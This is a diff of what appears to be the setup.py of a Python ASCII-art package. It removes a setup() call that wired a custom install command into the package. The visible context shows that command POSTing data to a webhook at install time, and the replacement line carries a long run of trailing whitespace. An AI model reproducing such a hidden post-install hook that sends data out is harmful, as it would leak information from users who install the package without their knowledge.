@@ -27,23 +27,4 @@ class PostInstallCommand(install):
         response = requests.post(url, json=data)
         print(f"Webhook sent: {response.status_code}")
 
-setup(
-    name="asciidrawing",
-    version="0.1.2",
-    packages=["asciidrawing"],
-    description="A simple Python utility to generate ASCII art from a given string using predefined character mappings.",
-    author="Arturo Munhez",
-    author_email="info@asciidrawing.com",
-    cmdclass={
-        "install": PostInstallCommand,
-    },
-    install_requires=[
-        "requests"  # Ensure requests is installed before running the post-install command
-    ],
-    python_requires='>=3.6',
-    entry_points={
-        "console_scripts": [
-            "asciidrawing = asciidrawing.cli:cli",
-        ],
-    },
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
